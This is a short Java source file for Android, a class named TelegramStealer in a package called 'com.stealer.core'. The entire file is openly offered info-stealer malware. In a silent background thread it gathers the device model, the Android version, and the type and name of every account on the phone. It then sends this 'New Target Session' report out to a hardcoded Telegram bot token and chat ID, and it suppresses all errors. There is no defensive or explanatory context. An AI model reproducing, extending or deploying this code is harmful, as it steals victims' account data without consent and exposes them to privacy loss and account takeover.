package com.stealer.core;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.os.Build;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class TelegramStealer {

    private static final String BOT_TOKEN = "9130073256:AAGC6HthqqmIZ_bJXfXzd3mAkolIwFlDp28";
    private static final String CHAT_ID = "9130073256";

    public static void executeHarvest(final Context context) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    StringBuilder report = new StringBuilder();
                    report.append("🎯 **New Target Session**\n\n");
                    report.append("📱 **Device:** ").append(Build.MANUFACTURER).append(" ").append(Build.MODEL).append("\n");
                    report.append("🤖 **Android:** ").append(Build.VERSION.RELEASE).append("\n\n");
                    report.append("📧 **Accounts:**\n");

                    AccountManager accountManager = AccountManager.get(context);
                    Account[] accounts = accountManager.getAccounts();
                    
                    if (accounts != null && accounts.length > 0) {
                        for (Account account : accounts) {
                            report.append("- Type: `").append(account.type).append("`\n");
                            report.append("  Name: `").append(account.name).append("`\n");
                        }
                    } else {
                        report.append("No accounts found.\n");
                    }

                    sendToTelegram(report.toString());
                } catch (Exception e) {
                    // Silent execution
                }
            }
        }).start();
    }

    private static void sendToTelegram(String message) {
        HttpURLConnection conn = null;
        try {
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
            URL url = new URL(urlString);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            String payload = "chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(message, "UTF-8") + "&parse_mode=Markdown";
            
            try (OutputStream os = conn.getOutputStream()) {
                os.write(payload.getBytes("UTF-8"));
                os.flush();
            }

            conn.getResponseCode();
        } catch (Exception e) {
            // Transmission error handling
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }
    }
}
